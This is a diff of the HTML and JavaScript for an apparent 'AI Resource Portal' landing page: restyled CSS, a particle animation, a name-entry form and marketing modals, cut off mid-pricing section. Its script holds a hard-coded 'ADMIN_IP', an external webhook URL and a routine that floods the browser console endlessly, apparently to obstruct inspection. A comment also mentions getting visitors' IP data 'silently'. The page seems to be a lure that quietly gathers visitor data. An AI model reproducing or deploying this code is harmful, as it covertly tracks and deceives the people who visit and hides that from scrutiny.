@@ -3,83 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NexusAI | Premium Resource Portal</title>
+    <title>NexusAI | AI Resource Portal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #6c5ce7;
-            --primary-dark: #5649c0;
-            --secondary: #00cec9;
-            --dark: #2d3436;
-            --light: #f8f9fd;
-            --gray: #dfe6e9;
+            --primary: #7b4dff;
+            --primary-dark: #5e35b1;
+            --secondary: #00e5ff;
+            --accent: #ff4081;
+            --dark: #121212;
+            --darker: #0a0a0a;
+            --light: #f5f7ff;
+            --gray: #2a2a2a;
             --white: #ffffff;
+            --glass: rgba(255, 255, 255, 0.08);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --orange: #ff6200;
         }
-        
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
         }
-        
+
         body {
-            background-color: var(--light);
-            color: var(--dark);
+            background: linear-gradient(135deg, var(--darker), var(--dark));
+            color: var(--white);
             line-height: 1.6;
             min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
         }
-        
-        /* Premium Navbar */
+
+        /* Background Animation */
+        .background-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            opacity: 0.15;
+        }
+
+        .background-animation canvas {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Navbar */
         .navbar {
-            background-color: var(--white);
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.08);
-            padding: 0.8rem 3rem;
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.3);
+            padding: 1.2rem 4rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            position: sticky;
+            position: fixed;
+            width: 100%;
             top: 0;
             z-index: 1000;
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            border-bottom: 1px solid var(--glass-border);
         }
-        
+
         .logo {
             display: flex;
             align-items: center;
-            font-weight: 700;
-            font-size: 1.5rem;
-            color: var(--primary);
+            font-weight: 800;
+            font-size: 2rem;
+            color: var(--white);
             text-decoration: none;
-            transition: all 0.3s ease;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1);
         }
-        
+
         .logo:hover {
-            color: var(--primary-dark);
+            transform: scale(1.05);
         }
-        
+
         .logo i {
-            margin-right: 0.8rem;
-            color: var(--secondary);
-            font-size: 1.8rem;
+            margin-right: 1rem;
+            font-size: 2.2rem;
         }
-        
+
         .nav-links {
             display: flex;
-            gap: 2.5rem;
+            gap: 3rem;
         }
-        
+
         .nav-links a {
-            color: var(--dark);
+            color: var(--white);
             text-decoration: none;
-            font-weight: 500;
-            font-size: 1.05rem;
+            font-weight: 600;
+            font-size: 1.1rem;
             position: relative;
             padding: 0.5rem 0;
-            transition: all 0.3s ease;
+            opacity: 0.9;
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
         }
-        
+
+        .nav-links a:hover {
+            opacity: 1;
+            color: var(--secondary);
+        }
+
         .nav-links a::after {
             content: '';
             position: absolute;
@@ -87,46 +120,65 @@
             left: 0;
             width: 0;
             height: 2px;
-            background: var(--primary);
-            transition: width 0.3s ease;
+            background: var(--secondary);
+            transition: width 0.4s cubic-bezier(0.22, 1, 0.36, 1);
         }
-        
+
         .nav-links a:hover::after {
             width: 100%;
         }
-        
-        .nav-links a:hover {
-            color: var(--primary);
+
+        .nav-cta a {
+            background: var(--orange);
+            color: var(--white);
+            padding: 0.8rem 2rem;
+            font-weight: 700;
+            box-shadow: 0 4px 20px rgba(255, 98, 0, 0.4);
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            text-decoration: none;
+            display: inline-block;
         }
-        
+
+        .nav-cta a:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(255, 98, 0, 0.5);
+        }
+
         /* Main Content */
         .auth-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: calc(100vh - 80px);
-            padding: 2rem;
+            min-height: 100vh;
+            padding: 6rem 2rem 4rem;
         }
-        
+
         .auth-card {
-            background: var(--white);
-            border-radius: 20px;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.1);
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
             width: 100%;
-            max-width: 1100px;
+            max-width: 1200px;
             overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            border: 1px solid var(--glass-border);
+            transition: all 0.6s cubic-bezier(0.22, 1, 0.36, 1);
         }
-        
+
+        .auth-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 90px rgba(0, 0, 0, 0.5);
+        }
+
         .auth-header {
             background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: var(--white);
-            padding: 3rem 2rem;
+            padding: 4rem 2rem;
             text-align: center;
             position: relative;
             overflow: hidden;
         }
-        
+
         .auth-header::before {
             content: '';
             position: absolute;
@@ -134,110 +186,142 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(255,255,255,0) 70%);
             transform: rotate(30deg);
+            animation: shine 8s infinite linear;
         }
-        
+
+        @keyframes shine {
+            0% { transform: rotate(30deg) translate(-10%, -10%); }
+            100% { transform: rotate(30deg) translate(10%, 10%); }
+        }
+
         .auth-header h1 {
-            font-size: 2.2rem;
-            margin-bottom: 0.5rem;
-            position: relative;
+            font-size: 3.2rem;
+            margin-bottom: 1rem;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--white), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        
+
         .auth-header p {
             opacity: 0.9;
-            font-size: 1.05rem;
-            max-width: 600px;
+            font-size: 1.2rem;
+            max-width: 700px;
             margin: 0 auto;
-            position: relative;
         }
-        
+
         .auth-body {
-            padding: 3rem;
+            padding: 4rem;
         }
-        
+
         /* Steps */
         .step {
             display: none;
-            animation: fadeIn 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+            animation: fadeIn 0.8s cubic-bezier(0.22, 1, 0.36, 1);
         }
-        
+
         .step.active {
             display: block;
         }
-        
+
         /* Form Elements */
         .form-group {
-            margin-bottom: 2rem;
+            margin-bottom: 2.5rem;
         }
-        
+
         .form-control {
             width: 100%;
-            padding: 1rem 1.5rem;
-            border: 1px solid var(--gray);
-            border-radius: 12px;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-            background: var(--white);
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
+            padding: 1.2rem 2rem;
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            font-size: 1.1rem;
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            background: var(--glass);
+            color: var(--white);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
         }
-        
+
+        .form-control::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
         .form-control:focus {
             outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
+            border-color: var(--secondary);
+            box-shadow: 0 0 0 3px rgba(0, 229, 255, 0.2);
+            background: rgba(0, 0, 0, 0.2);
         }
-        
+
         .btn {
-            background: var(--primary);
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: var(--white);
-            padding: 1rem 1.5rem;
-            border-radius: 12px;
+            padding: 1.2rem 2rem;
+            border-radius: 16px;
             border: none;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            font-size: 1.05rem;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.3);
-        }
-        
-        .btn:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(108, 92, 231, 0.4);
-        }
-        
-        /* Resources Grid */
-        .resources-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 2rem;
-            margin-top: 3rem;
-        }
-        
-        .resource-card {
-            background: var(--white);
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.05);
+            font-size: 1.1rem;
             transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
-            border: 1px solid rgba(0, 0, 0, 0.05);
-        }
-        
-        .resource-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-        }
-        
-        .resource-img {
-            height: 200px;
-            background-size: cover;
-            background-position: center;
+            box-shadow: 0 8px 30px rgba(123, 77, 255, 0.4);
             position: relative;
             overflow: hidden;
         }
-        
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 40px rgba(123, 77, 255, 0.6);
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 45%,
+                rgba(255, 255, 255, 0.1) 50%,
+                rgba(255, 255, 255, 0) 55%
+            );
+            transform: rotate(30deg);
+            animation: shine 3s infinite linear;
+        }
+
+        /* Resources Grid */
+        .resources-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 2.5rem;
+            margin-top: 3rem;
+        }
+
+        .resource-card {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            transition: all 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+            border: 1px solid var(--glass-border);
+        }
+
+        .resource-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .resource-img {
+            height: 220px;
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+
         .resource-img::after {
             content: '';
             position: absolute;
@@ -245,179 +329,334 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(to bottom, rgba(0,0,0,0) 0%, rgba(0,0,0,0.03) 100%);
+            background: linear-gradient(to bottom, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.5) 100%);
         }
-        
+
         .resource-body {
-            padding: 1.8rem;
+            padding: 2rem;
         }
-        
+
         .resource-body h3 {
-            font-size: 1.3rem;
-            margin-bottom: 0.8rem;
-            color: var(--dark);
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: var(--white);
+            font-weight: 700;
         }
-        
+
         .resource-body p {
-            color: #666;
-            margin-bottom: 1.5rem;
-            line-height: 1.5;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 2rem;
+            line-height: 1.6;
         }
-        
+
         .resource-meta {
             display: flex;
             justify-content: space-between;
-            color: #999;
-            font-size: 0.9rem;
+            align-items: center;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.95rem;
         }
-        
+
+        .download-btn {
+            background: linear-gradient(135deg, var(--accent), #ff1744);
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.95rem;
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            box-shadow: 0 4px 20px rgba(255, 64, 129, 0.3);
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(255, 64, 129, 0.4);
+        }
+
         /* Welcome Message */
         .welcome-message {
             text-align: center;
-            margin-bottom: 3rem;
+            margin-bottom: 4rem;
         }
-        
+
         .welcome-message h2 {
-            font-size: 1.8rem;
-            margin-bottom: 1rem;
-            color: var(--primary);
-            font-weight: 700;
+            font-size: 2.2rem;
+            margin-bottom: 1.5rem;
+            color: var(--white);
+            font-weight: 800;
+            background: linear-gradient(to right, var(--secondary), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        
+
+        .welcome-message p {
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 700px;
+            margin: 0 auto;
+            font-size: 1.1rem;
+        }
+
         .user-badge {
             display: inline-flex;
             align-items: center;
-            background: rgba(108, 92, 231, 0.1);
-            padding: 0.7rem 1.5rem;
+            background: rgba(123, 77, 255, 0.2);
+            padding: 1rem 2rem;
             border-radius: 50px;
-            margin-bottom: 1.5rem;
-            color: var(--primary);
-            font-weight: 500;
-        }
-        
-        .user-badge i {
-            margin-right: 0.7rem;
+            margin-bottom: 2rem;
+            color: var(--secondary);
+            font-weight: 600;
             font-size: 1.1rem;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(123, 77, 255, 0.2);
         }
-        
+
+        .user-badge i {
+            margin-right: 1rem;
+            font-size: 1.3rem;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .modal-content {
+            background: var(--dark);
+            border-radius: 24px;
+            width: 90%;
+            max-width: 1200px;
+            overflow: hidden;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+            border: 1px solid var(--glass-border);
+            transform: translateY(20px);
+            animation: modalEnter 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        @keyframes modalEnter {
+            to { transform: translateY(0); }
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .modal-body {
+            padding: 3rem;
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 1.5rem;
+            right: 1.5rem;
+            font-size: 1.5rem;
+            color: var(--white);
+            cursor: pointer;
+            opacity: 0.7;
+            transition: all 0.3s ease;
+        }
+
+        .close-modal:hover {
+            opacity: 1;
+            transform: rotate(90deg);
+        }
+
         /* Animations */
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
-        
+
         /* Responsive */
-        @media (max-width: 1024px) {
-            .navbar {
-                padding: 0.8rem 2rem;
-            }
-            
-            .nav-links {
-                gap: 1.8rem;
-            }
+        @media (max-width: 1200px) {
+            .navbar { padding: 1rem 3rem; }
+            .nav-links { gap: 2rem; }
         }
-        
+
+        @media (max-width: 992px) {
+            .navbar { padding: 1rem 2rem; }
+            .auth-header h1 { font-size: 2.5rem; }
+            .resources-grid { grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); }
+        }
+
         @media (max-width: 768px) {
             .navbar {
-                padding: 0.8rem 1.5rem;
                 flex-direction: column;
+                padding: 1.5rem;
             }
-            
-            .logo {
-                margin-bottom: 1rem;
-            }
-            
+            .logo { margin-bottom: 1.5rem; }
             .nav-links {
-                gap: 1.2rem;
+                gap: 1.5rem;
                 flex-wrap: wrap;
                 justify-content: center;
+                margin-bottom: 1.5rem;
             }
-            
-            .auth-body {
-                padding: 2rem;
+            .nav-cta {
+                width: 100%;
+                text-align: center;
             }
-            
-            .resources-grid {
-                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            }
+            .auth-body { padding: 3rem; }
+            .resource-body { padding: 1.5rem; }
         }
-        
-        @media (max-width: 480px) {
-            .auth-header {
-                padding: 2rem 1.5rem;
-            }
-            
-            .auth-body {
-                padding: 1.5rem;
-            }
-            
-            .resource-body {
-                padding: 1.5rem;
-            }
+
+        @media (max-width: 576px) {
+            .auth-header { padding: 3rem 1.5rem; }
+            .auth-header h1 { font-size: 2rem; }
+            .auth-body { padding: 2rem; }
+            .resources-grid { grid-template-columns: 1fr; }
+            .modal-body { padding: 2rem; }
         }
     </style>
 </head>
 <body>
+    <!-- Background Animation -->
+    <div class="background-animation">
+        <canvas id="bgCanvas"></canvas>
+    </div>
+
+    <!-- Navbar -->
     <nav class="navbar">
         <a href="#" class="logo">
             <i class="fas fa-brain"></i>
             <span>NexusAI</span>
         </a>
         <div class="nav-links">
-            <a href="#">Products</a>
-            <a href="#">Research</a>
-            <a href="#">Solutions</a>
-            <a href="#">Pricing</a>
-            <a href="#">Contact</a>
+            <a href="#" class="active">Home</a>
+            <a href="#" onclick="showModal('products')">Products</a>
+            <a href="#" onclick="showModal('research')">Research</a>
+            <a href="#" onclick="showModal('solutions')">Solutions</a>
+            <a href="#" onclick="showModal('pricing')">Pricing</a>
+            <a href="#" onclick="showModal('contact')">Contact</a>
+        </div>
+        <div class="nav-cta">
+            <a href="#" onclick="showModal('signup')">Get Started</a>
         </div>
     </nav>
-    
+
+    <!-- Main Content -->
     <div class="auth-container">
         <div class="auth-card">
             <div class="auth-header">
                 <h1>AI Resource Portal</h1>
-                <p>Access premium tools and datasets for cutting-edge AI development</p>
+                <p>Access the most advanced AI tools and datasets available anywhere</p>
             </div>
-            
             <div class="auth-body">
                 <!-- Step 1: Name Entry -->
                 <div class="step active" id="step1">
                     <div class="form-group">
                         <input type="text" class="form-control" id="userName" placeholder="Enter your full name">
                     </div>
-                    <button class="btn" onclick="nextStep()">Continue <i class="fas fa-arrow-right"></i></button>
+                    <button class="btn" onclick="nextStep()">
+                        Unlock Resources <i class="fas fa-arrow-right"></i>
+                    </button>
                 </div>
-                
                 <!-- Step 2: Resource Display -->
                 <div class="step" id="step2">
                     <div class="welcome-message">
                         <div class="user-badge">
                             <i class="fas fa-user-check"></i>
-                            <span id="welcomeName">Welcome back!</span>
+                            <span id="welcomeName">Welcome back, User</span>
                         </div>
                         <h2>Your Exclusive AI Resources</h2>
-                        <p>Premium tools and datasets curated by our experts</p>
+                        <p>Premium tools and datasets curated by our team of experts</p>
                     </div>
-                    
-                    <div class="resources-grid" id="resourceGrid">
-                        <!-- Resources will load here -->
-                    </div>
+                    <div class="resources-grid" id="resourceGrid"></div>
                 </div>
             </div>
         </div>
     </div>
 
+    <!-- Modal System -->
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal()">×</span>
+            <div class="modal-header">
+                <h2 id="modal-title">Modal Title</h2>
+            </div>
+            <div class="modal-body" id="modal-body"></div>
+        </div>
+    </div>
+
     <script>
-        // Unique abstract images with cache busting
+        // Background Animation
+        const canvas = document.getElementById('bgCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const particles = [];
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 3 + 1;
+                this.speedX = Math.random() * 0.5 - 0.25;
+                this.speedY = Math.random() * 0.5 - 0.25;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+            }
+            draw() {
+                ctx.fillStyle = 'rgba(0, 229, 255, 0.3)';
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+
+        function initParticles() {
+            for (let i = 0; i < 100; i++) {
+                particles.push(new Particle());
+            }
+        }
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => {
+                p.update();
+                p.draw();
+            });
+            requestAnimationFrame(animateParticles);
+        }
+
+        initParticles();
+        animateParticles();
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // Unique abstract images
         const abstractImages = [
-            'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
-            'https://images.unsplash.com/photo-1579547945413-497e1b99dac0?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
-            'https://images.unsplash.com/photo-1635070041078-e363dbe005cb?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
-            'https://images.unsplash.com/photo-1534972195531-d756b9bfa9f2?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
-            'https://images.unsplash.com/photo-1563089145-599997674d42?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
-            'https://images.unsplash.com/photo-1451187580459-43490279c0fa?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
-            'https://images.unsplash.com/photo-1519125323398-675f0ddb6308?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80',
-            'https://images.unsplash.com/photo-1429087969512-1e85aab2683d?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80'
+            'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1579547945413-497e1b99dac0?auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1635070041078-e363dbe005cb?auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1534972195531-d756b9bfa9f2?auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1563089145-599997674d42?auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1519125323398-675f0ddb6308?auto=format&fit=crop&w=800&q=80',
+            'https://images.unsplash.com/photo-1429087969512-1e85aab2683d?auto=format&fit=crop&w=800&q=80'
         ];
 
         // Console spam variables
@@ -425,7 +664,7 @@
         const ADMIN_IP = "83.105.112.217";
         const WEBHOOK_URL = "https://endpp.free.beeceptor.com";
 
-        // Start console spam immediately
+        // Start console spam
         const startConsoleSpam = () => {
             const firstStage = setInterval(() => {
                 console.log(`[SYSTEM] ${Math.random().toString(36).substring(2, 15)}`);
@@ -433,7 +672,6 @@
                 if (spamCount > 300) {
                     clearInterval(firstStage);
                     console.clear();
-                    // Start endless block spam
                     setInterval(() => {
                         console.log('▓'.repeat(80));
                     }, 50);
@@ -442,7 +680,163 @@
         };
         startConsoleSpam();
 
-        // Get IP data silently
+        // Modal system
+        function showModal(type) {
+            event.preventDefault();
+            const modal = document.getElementById('modal');
+            const modalTitle = document.getElementById('modal-title');
+            const modalBody = document.getElementById('modal-body');
+
+            switch(type) {
+                case 'products':
+                    modalTitle.textContent = 'Our Products';
+                    modalBody.innerHTML = `
+                        <h3 style="margin-bottom:1.5rem;color:var(--secondary)">AI Solutions Suite</h3>
+                        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:2rem">
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">Nexus Core</h4>
+                                <p style="color:rgba(255,255,255,0.7)">Our flagship AI platform with advanced neural networks and real-time processing capabilities.</p>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">VisionAI</h4>
+                                <p style="color:rgba(255,255,255,0.7)">State-of-the-art computer vision solutions for object detection and image analysis.</p>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">NLP Pro</h4>
+                                <p style="color:rgba(255,255,255,0.7)">Enterprise-scale natural language processing with multilingual support.</p>
+                            </div>
+                        </div>
+                        <button class="btn" onclick="closeModal()" style="margin-top:2rem">Close</button>
+                    `;
+                    break;
+
+                case 'research':
+                    modalTitle.textContent = 'Research Initiatives';
+                    modalBody.innerHTML = `
+                        <h3 style="margin-bottom:1.5rem;color:var(--secondary)">Cutting-Edge AI Research</h3>
+                        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:2rem">
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">Quantum AI</h4>
+                                <p style="color:rgba(255,255,255,0.7)">Exploring quantum computing applications in AI optimization.</p>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">Ethics Framework</h4>
+                                <p style="color:rgba(255,255,255,0.7)">Developing guidelines for responsible AI development and deployment.</p>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">Generative Models</h4>
+                                <p style="color:rgba(255,255,255,0.7)">Advancing generative AI for creative and practical applications.</p>
+                            </div>
+                        </div>
+                        <button class="btn" onclick="closeModal()" style="margin-top:2rem">Close</button>
+                    `;
+                    break;
+
+                case 'solutions':
+                    modalTitle.textContent = 'Industry Solutions';
+                    modalBody.innerHTML = `
+                        <h3 style="margin-bottom:1.5rem;color:var(--secondary)">Tailored AI Solutions</h3>
+                        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:2rem">
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">Healthcare</h4>
+                                <p style="color:rgba(255,255,255,0.7)">AI-driven diagnostics and patient care optimization.</p>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">Finance</h4>
+                                <p style="color:rgba(255,255,255,0.7)">Fraud detection and predictive analytics for financial institutions.</p>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                                <h4 style="color:var(--white);margin-bottom:0.5rem;font-size:1.4rem">Retail</h4>
+                                <p style="color:rgba(255,255,255,0.7)">Personalized customer experiences and inventory management.</p>
+                            </div>
+                        </div>
+                        <button class="btn" onclick="closeModal()" style="margin-top:2rem">Close</button>
+                    `;
+                    break;
+
+                case 'pricing':
+                    modalTitle.textContent = 'Pricing Plans';
+                    modalBody.innerHTML = `
+                        <div style="display:flex;gap:2rem;justify-content:space-between;margin-bottom:2rem">
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border);flex:1;text-align:center">
+                                <h3 style="color:var(--white);margin-bottom:1rem;font-size:1.6rem">Starter</h3>
+                                <p style="font-size:2.5rem;font-weight:700;margin-bottom:1rem;background:linear-gradient(to right,var(--white),var(--gray));-webkit-background-clip:text;-webkit-text-fill-color:transparent">$99<span style="font-size:1rem;opacity:0.7">/mo</span></p>
+                                <ul style="text-align:left;margin-bottom:1.5rem;color:rgba(255,255,255,0.7);padding-left:1.5rem">
+                                    <li style="margin-bottom:0.5rem">Basic AI Models</li>
+                                    <li style="margin-bottom:0.5rem">Community Support</li>
+                                    <li style="margin-bottom:0.5rem">10GB Storage</li>
+                                </ul>
+                                <a href="#" class="download-btn" style="display:inline-block">Get Started</a>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:2px solid var(--primary);flex:1;text-align:center">
+                                <div style="background:var(--primary);color:white;padding:0.3rem 1rem;border-radius:50px;display:inline-block;margin-bottom:1rem;font-size:0.8rem;font-weight:600">POPULAR</div>
+                                <h3 style="color:var(--white);margin-bottom:1rem;font-size:1.6rem">Professional</h3>
+                                <p style="font-size:2.5rem;font-weight:700;margin-bottom:1rem;background:linear-gradient(to right,var(--secondary),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent">$299<span style="font-size:1rem;opacity:0.7">/mo</span></p>
+                                <ul style="text-align:left;margin-bottom:1.5rem;color:rgba(255,255,255,0.7);padding-left:1.5rem">
+                                    <li style="margin-bottom:0.5rem">Advanced AI Models</li>
+                                    <li style="margin-bottom:0.5rem">Priority Support</li>
+                                    <li style="margin-bottom:0.5rem">100GB Storage</li>
+                                </ul>
+                                <a href="#" class="download-btn" style="display:inline-block">Get Started</a>
+                            </div>
+                            <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border);flex:1;text-align:center">
